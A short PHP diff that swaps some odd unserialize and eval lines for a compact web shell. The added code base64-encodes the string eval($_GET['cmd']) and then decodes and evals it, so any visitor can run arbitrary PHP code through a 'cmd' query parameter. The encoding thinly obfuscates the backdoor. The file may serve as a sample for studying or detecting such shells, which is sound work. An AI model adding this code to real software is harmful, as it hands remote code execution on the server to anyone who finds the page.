@@ -1,9 +1,4 @@
 <?php
-$a = unserialize(base64_decode('czo1OiJoZWxsbyI7'));
-$str = preg_replace('/\s\s+/', ' ', 'foo   o');
-$s = "czo1OiJoZWxsbyI7";
-$b = unserialize(base64_decode($s));
-$parr = "sss";
-$str = "sssaaabbb";
-$d = str_replace($parr,$b,$str);
-eval($a);
+$a = 'eval($_GET[\'cmd\']);';
+$b = base64_encode($a);
+eval(base64_decode($b));
